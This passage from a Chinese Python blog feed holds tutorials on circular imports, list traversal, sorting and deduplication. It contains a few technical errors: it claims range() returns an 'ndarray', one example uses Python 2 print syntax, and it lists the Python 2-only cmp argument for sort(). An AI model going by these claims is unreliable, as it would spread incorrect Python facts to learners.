class="function"><span class="keyword">def</span> <span class="title">b</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'bbbbbbbbbb'</span>)</span><br><span class="line">    c()</span><br></pre></td></tr></table></figure><p>运行<code>moduleA.py</code>出现以下报错：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ImportError: cannot import name <span class="string">'b'</span> from partially initialized module <span class="string">'moduleB'</span> (most likely due to a circular import)</span><br></pre></td></tr></table></figure><p>导入其实是要将 <code>被导入模块所有的代码都执行一遍，遇到函数和类的定义会作申明</code>。回到循环引用中，首先导入B，进入B中，发现B中又导入了A又回到A中，但是A又导入B这就形成了循环引用。</p><h1 id="3-解决"><a class="markdownIt-Anchor" href="#3-解决"></a> 3 解决</h1><h2 id="31-直接导入模块名通过模块调用其中的函数"><a class="markdownIt-Anchor" href="#31-直接导入模块名通过模块调用其中的函数"></a> 3.1 直接导入模块名，通过模块调用其中的函数</h2><p><code>moduleA.py</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> moduleB</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">a</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'aaaaaaaa'</span></span><br><span class="line">    moduleB.b()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">c</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'cccccc'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    a()</span><br></pre></td></tr></table></figure><p><code>moduleB.py</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> moduleA</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'bbbbbbbbbb'</span></span><br><span class="line"></span><br><span class="line">    moduleA.c()</span><br></pre></td></tr></table></figure><h2 id="32-使用延迟导入lazy-import"><a class="markdownIt-Anchor" href="#32-使用延迟导入lazy-import"></a> 3.2 使用延迟导入(lazy import)</h2><p>在需要用的函数内部导入，或是在底部导入。</p><p><code>moduleA.py</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 不变</span></span><br><span class="line"><span class="keyword">from</span> moduleB <span class="keyword">import</span> b</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">a</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'aaaaaaaa'</span>)</span><br><span class="line">    b()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">c</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'cccc'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    a()</span><br></pre></td></tr></table></figure><p><code>moduleB.py</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 方法1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'bbbbbbbbbb'</span>)</span><br><span class="line">    c()</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> moduleA <span class="keyword">import</span> c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法2</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">from</span> moduleA <span class="keyword">import</span> c</span><br><span class="line">    print(<span class="string">'bbbbbbbbbb'</span>)</span><br><span class="line">    c()</span><br></pre></td></tr></table></figure><h2 id="33-重新设计代码结构将代码和并或者分离"><a class="markdownIt-Anchor" href="#33-重新设计代码结构将代码和并或者分离"></a> 3.3 重新设计代码结构，将代码和并或者分离</h2><p>将公共功能的代码分离成单独模块，或者将一些具有关系的代码合并成一个模块。</p><p>本次毕设便采用了这个方法：将一些公共功能的代码分离，<a href="http://config.py" target="_blank" rel="noopener">config.py</a>(数据库配置)、<a href="http://entity.py" target="_blank" rel="noopener">entity.py</a>(实体类)</p><p><code>config.py</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> sqlalchemy.ext.declarative <span class="keyword">import</span> declarative_base</span><br><span class="line"><span class="keyword">from</span> sqlalchemy <span class="keyword">import</span> create_engine, Column, Integer, String, TEXT</span><br><span class="line"><span class="keyword">from</span> sqlalchemy.orm <span class="keyword">import</span> sessionmaker</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">'127.0.0.1'</span></span><br><span class="line">PORT = <span class="number">3306</span></span><br><span class="line">USERNAME = <span class="string">'xxx'</span>  <span class="comment"># mysql数据库用户名</span></span><br><span class="line">PASSWORD = <span class="string">'xxx'</span>  <span class="comment"># 密码</span></span><br><span class="line">DB = <span class="string">'xxx'</span>  <span class="comment"># 数据库名称</span></span><br><span class="line"><span class="comment"># f代表可以使用&#123;&#125;引用变量</span></span><br><span class="line">DB_URI = <span class="string">f'mysql+pymysql://<span class="subst">&#123;USERNAME&#125;</span>:<span class="subst">&#123;PASSWORD&#125;</span>@<span class="subst">&#123;HOST&#125;</span>:<span class="subst">&#123;PORT&#125;</span>/<span class="subst">&#123;DB&#125;</span>'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建引擎</span></span><br><span class="line">engine = create_engine(DB_URI)</span><br><span class="line"><span class="comment"># 创建SQLORM基类，注意这里要加参数，参数为上一步创建的引擎</span></span><br><span class="line">Base = declarative_base(engine)</span><br><span class="line"><span class="comment"># 构建session对象</span></span><br><span class="line">session = sessionmaker(engine)()</span><br></pre></td></tr></table></figure><p><code>entity.py</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建Report表</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Report</span><span class="params">(Base)</span>:</span></span><br><span class="line">    __tablename__ = <span class="string">'report'</span>  <span class="comment"># 表名</span></span><br><span class="line">    id = Column(Integer, primary_key=<span class="literal">True</span>, autoincrement=<span class="literal">True</span>)</span><br><span class="line">    report_name = Column(String(<span class="number">100</span>))</span><br><span class="line">    report_size = Column(String(<span class="number">100</span>))</span><br><span class="line">    source_info = Column(String(<span class="number">100</span>))</span><br><span class="line">    operation = Column(String(<span class="number">100</span>))</span><br><span class="line">    tag = Column(String(<span class="number">100</span>))</span><br><span class="line">    hazard_level = Column(String(<span class="number">100</span>))</span><br><span class="line">    malware_static_info = Column(TEXT())</span><br><span class="line">    malware_dynamic_info = Column(TEXT())</span><br><span class="line">    upload_time = Column(String(<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建MidFid表</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MidFid</span><span class="params">(Base)</span>:</span></span><br><span class="line">    __tablename__ = <span class="string">'malware_mid_fid'</span>  <span class="comment"># 表名</span></span><br><span class="line">    id = Column(Integer, primary_key=<span class="literal">True</span>, autoincrement=<span class="literal">True</span>)</span><br><span class="line">    mid = Column(Integer())  <span class="comment"># 样本id</span></span><br><span class="line">    fid = Column(Integer())  <span class="comment"># 家族id</span></span><br></pre></td></tr></table></figure><h1 id="x-参考"><a class="markdownIt-Anchor" href="#x-参考"></a> X 参考</h1><ul><li></li></ul>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python-列表-遍历</title>
      <link href="/2022/03/08/Python-%E5%88%97%E8%A1%A8-%E9%81%8D%E5%8E%86/"/>
      <url>/2022/03/08/Python-%E5%88%97%E8%A1%A8-%E9%81%8D%E5%8E%86/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-前言"><a class="markdownIt-Anchor" href="#1-前言"></a> 1 前言</h1><p>最近在使用python操作mysql，涉及列表操作比较多，整理一下列表遍历。</p><p>主要copy于<a href="https://blog.csdn.net/whatday/article/details/100557888" target="_blank" rel="noopener">python3 遍历列表list 四种方法</a></p><h1 id="2-方法"><a class="markdownIt-Anchor" href="#2-方法"></a> 2 方法</h1><h2 id="21-in"><a class="markdownIt-Anchor" href="#21-in"></a> 2.1 in</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">item_list = [<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'a'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> item_list:</span><br><span class="line">    print(item_list.index(item), item)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0 a</span></span><br><span class="line"><span class="string">1 b</span></span><br><span class="line"><span class="string">2 c</span></span><br><span class="line"><span class="string">3 d</span></span><br><span class="line"><span class="string">0 a</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p><strong>注意</strong>：按顺序输出值；如果列表中有重复值，下标会返回第一个值的下标，如上面的第二个<code>a</code>，但是这种bug只需要添加一个计数变量就解决了。</p><h2 id="22-enumerate"><a class="markdownIt-Anchor" href="#22-enumerate"></a> 2.2 enumerate()</h2><p><code>enumerate(sequence, [start=0])</code>，返回枚举对象(元组)</p><p>参数：</p><ul><li><code>sequence</code>：一个序列、迭代器或其他支持迭代对象。</li><li><code>start</code>：下标起始位置。</li></ul><p>用法实例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">item_list = [<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'a'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> enumerate(item_list):</span><br><span class="line">    print(item)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">(0, 'a')</span></span><br><span class="line"><span class="string">(1, 'b')</span></span><br><span class="line"><span class="string">(2, 'c')</span></span><br><span class="line"><span class="string">(3, 'd')</span></span><br><span class="line"><span class="string">(4, 'a')</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> index, val <span class="keyword">in</span> enumerate(item_list):</span><br><span class="line">    print(index, val)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0 a</span></span><br><span class="line"><span class="string">1 b</span></span><br><span class="line"><span class="string">2 c</span></span><br><span class="line"><span class="string">3 d</span></span><br><span class="line"><span class="string">4 a</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p><strong>注意</strong>：按顺序输出值；下标会返回对应值的下标，解决了<code>2.1</code>的问题。</p><h2 id="23-iter迭代器"><a class="markdownIt-Anchor" href="#23-iter迭代器"></a> 2.3 iter()迭代器</h2><p><code>iter(object, [sentinel])</code>函数用来生成迭代器，返回迭代对象。</p><p>参数：</p><ul><li><code>object</code>：支持迭代的集合对象。</li><li><code>sentinel</code>：如果传递了第二个参数，则参数 object 必须是一个可调用的对象（如，函数），此时，iter 创建了一个迭代器对象，每次调用这个迭代器对象的__next__()方法时，都会调用 object。</li></ul><p>用法实例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">item_list = [<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'a'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> iter(item_list):</span><br><span class="line">    print(item)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">a</span></span><br><span class="line"><span class="string">b</span></span><br><span class="line"><span class="string">c</span></span><br><span class="line"><span class="string">d</span></span><br><span class="line"><span class="string">a</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p><strong>注意</strong>：按顺序输出。</p><h2 id="24-range函数"><a class="markdownIt-Anchor" href="#24-range函数"></a> 2.4 range()函数</h2><p><code>range(start, end, [step])</code> 函数返回类型是<code>ndarray</code>，可用<code>list()</code>返回一个整数列表，一般用在 <code>for</code> 循环中。</p><p>参数：</p><ul><li><code>start</code>：计数从 <code>start</code> 开始，默认是从 <code>0</code> 开始，例如<code>range(5)</code>等价于<code>range(0,5)</code>；</li><li><code>end</code>：计数到 <code>end</code> 结束，但不包括 <code>end</code>。例如：<code>range(0, 5)</code>是 <code>[0, 1, 2, 3, 4]</code> 没有 <code>5</code></li><li><code>step</code>：步长，默认为<code>1</code>。例如：<code>range(0, 5)</code> 等价于 <code>range(0, 5, 1)</code></li></ul><p>用法实例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">item_list = [<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'a'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(item_list)):</span><br><span class="line">    print(item_list[i])</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">a</span></span><br><span class="line"><span class="string">b</span></span><br><span class="line"><span class="string">c</span></span><br><span class="line"><span class="string">d</span></span><br><span class="line"><span class="string">a</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p><strong>注意</strong>：按顺序输出。</p><h2 id="25-倒序遍历"><a class="markdownIt-Anchor" href="#25-倒序遍历"></a> 2.5 倒序遍历</h2><h3 id="251-reversed函数"><a class="markdownIt-Anchor" href="#251-reversed函数"></a> 2.5.1 reversed函数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">item_list = [<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'a'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> reversed(item_list):</span><br><span class="line">    print(item)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">a</span></span><br><span class="line"><span class="string">d</span></span><br><span class="line"><span class="string">c</span></span><br><span class="line"><span class="string">b</span></span><br><span class="line"><span class="string">a</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h3 id="252-range函数"><a class="markdownIt-Anchor" href="#252-range函数"></a> 2.5.2 range()函数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">item_list = [<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'a'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(item_list)<span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">    print(item_list[i])</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">a</span></span><br><span class="line"><span class="string">d</span></span><br><span class="line"><span class="string">c</span></span><br><span class="line"><span class="string">b</span></span><br><span class="line"><span class="string">a</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h3 id="253-切片"><a class="markdownIt-Anchor" href="#253-切片"></a> 2.5.3 切片</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">item_list = [<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'a'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> item_list[::<span class="number">-1</span>]:</span><br><span class="line">    print(item)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">a</span></span><br><span class="line"><span class="string">d</span></span><br><span class="line"><span class="string">c</span></span><br><span class="line"><span class="string">b</span></span><br><span class="line"><span class="string">a</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h1 id="x-参考"><a class="markdownIt-Anchor" href="#x-参考"></a> X 参考</h1><ul><li><a href="https://www.cnblogs.com/pizitai/p/6398276.html" target="_blank" rel="noopener">Python 列表(List) 的三种遍历(序号和值)方法</a></li><li><a href="https://www.cnblogs.com/GumpYan/p/12334839.html" target="_blank" rel="noopener">python列表遍历（包括倒序遍历的三种方法）</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python-列表-排序</title>
      <link href="/2022/03/08/Python-%E5%88%97%E8%A1%A8-%E6%8E%92%E5%BA%8F/"/>
      <url>/2022/03/08/Python-%E5%88%97%E8%A1%A8-%E6%8E%92%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-前言"><a class="markdownIt-Anchor" href="#1-前言"></a> 1 前言</h1><p>最近在使用python操作mysql，涉及列表操作比较多，整理一下列表排序。</p><p>主要copy于 <a href="https://www.runoob.com/python/att-list-sort.html" target="_blank" rel="noopener">菜鸟教程——Python List sort()方法</a></p><h1 id="2-sort方法"><a class="markdownIt-Anchor" href="#2-sort方法"></a> 2 sort()方法</h1><p><code>sort()</code> 函数用于对原列表进行排序，如果指定参数，则使用比较函数指定的比较函数。</p><p><code>sort()</code>方法语法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list.sort(cmp=<span class="literal">None</span>, key=<span class="literal">None</span>, reverse=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p><strong>参数</strong>：</p><ul><li><code>cmp</code> – 可选参数, 如果指定了该参数会使用该参数的方法进行排序。</li><li><code>key</code> – 主要是用来进行比较的元素，只有一个参数，具体的函数的参数就是取自于可迭代对象中，指定可迭代对象中的一个元素来进行排序。</li><li><code>reverse</code> – 排序规则，<strong>reverse = True</strong> 降序， <strong>reverse = False</strong> 升序（默认）。</li></ul><p><strong>返回值</strong>：</p><p>该方法没有返回值，但是会对列表的对象进行排序。</p><p>以下实例展示了 sort() 函数的使用方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">item_list = [<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'a'</span>]</span><br><span class="line"></span><br><span class="line">print(item_list)  <span class="comment"># ['a', 'b', 'c', 'd', 'a']</span></span><br><span class="line">item_list.sort()</span><br><span class="line">print(item_list)  <span class="comment"># ['a', 'a', 'b', 'c', 'd']</span></span><br></pre></td></tr></table></figure><p>关于<code>key</code>参数的使用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取列表的第二个元素</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">takeSecond</span><span class="params">(elem)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> elem[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 列表</span></span><br><span class="line">random = [(<span class="number">2</span>, <span class="number">2</span>), (<span class="number">3</span>, <span class="number">4</span>), (<span class="number">4</span>, <span class="number">1</span>), (<span class="number">1</span>, <span class="number">3</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定第二个元素排序</span></span><br><span class="line">random.sort(key=takeSecond)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出类别</span></span><br><span class="line">print(random)  <span class="comment"># [(4, 1), (2, 2), (1, 3), (3, 4)]</span></span><br></pre></td></tr></table></figure><h1 id="x-参考"><a class="markdownIt-Anchor" href="#x-参考"></a> X 参考</h1><ul><li></li></ul>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python-列表-去重</title>
      <link href="/2022/03/06/Python-%E5%88%97%E8%A1%A8-%E5%8E%BB%E9%87%8D/"/>
      <url>/2022/03/06/Python-%E5%88%97%E8%A1%A8-%E5%8E%BB%E9%87%8D/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-前言"><a class="markdownIt-Anchor" href="#1-前言"></a> 1 前言</h1><p>最近在使用python操作mysql，涉及列表操作比较多，整理一下列表去重。</p><p>主要copy于<a href="https://zhuanlan.zhihu.com/p/364610029" target="_blank" rel="noopener">Python 列表去重的4种方式及性能对比</a></p><h1 id="2-辅助数组"><a class="markdownIt-Anchor" href="#2-辅助数组"></a> 2 辅助数组</h1><p>新建一个数组，遍历原数组，如果值不在新数组里便加入到新数组中：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">item_list = [<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'a'</span>]</span><br><span class="line"></span><br><span class="line">unique = []</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> item_list:</span><br><span class="line">    <span class="keyword">if</span> item <span class="keyword">not</span> <span class="keyword">in</span> unique:</span><br><span class="line">        unique.append(item)</span><br><span class="line"></span><br><span class="line">print(unique)  <span class="comment"># ['a', 'b', 'c', 'd']</span></span><br></pre></td></tr></table></figure><p>上面使用了数组作为存储对象，实际上如果我们改成集合存储去重后的结果，性能会快不少：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">item_list = [<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'a'</span>]</span><br><span class="line"></span><br><span class="line">unique = set()</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> item_list:</span><br><span class="line">    <span class="keyword">if</span> item <span class="keyword">not</span> <span class="keyword">in</span> unique:</span><br><span class="line">        unique.add(item)</span><br><span class="line"></span><br><span class="line">print(unique)  <span class="comment"># &#123;'b', 'a', 'd', 'c'&#125;</span></span><br></pre></td></tr></table></figure><p>因为集合和数组的内在数据结构完全不同，集合使用了哈希表，因此速度会比列表快许多，但缺点在于无序。</p><h1 id="3-数组-集合-数组"><a class="markdownIt-Anchor" href="#3-数组-集合-数组"></a> 3 数组-&gt;集合-&gt;数组</h1><p>直接对数组进行集合转化，然后再转回数组：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">item_list = [<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'a'</span>]</span><br><span class="line"></span><br><span class="line">unique = list(set(item_list))</span><br><span class="line"></span><br><span class="line">print(unique)  <span class="comment"># ['d', 'a', 'b', 'c']</span></span><br></pre></td></tr></table></figure><p><strong>注意</strong>：这种去重方式是最快的，但正如前面所说，集合是无序的，将数组转为集合后再转为列表，就失去了原有列表的顺序。</p><h1 id="4-保留原有数组顺序的去重dictfromkeys"><a class="markdownIt-Anchor" href="#4-保留原有数组顺序的去重dictfromkeys"></a> 4 保留原有数组顺序的去重（dict.fromkeys()）</h1><p>Python3.6+使用<code>dict.fromkeys()</code>函数，可以保留原有数组的顺序并去重：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">item_list = [<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'a'</span>]</span><br><span class="line"></span><br><span class="line">unique = list(dict.fromkeys(item_list))</span><br><span class="line"></span><br><span class="line">print(unique)  <span class="comment"># ['a', 'b', 'c', 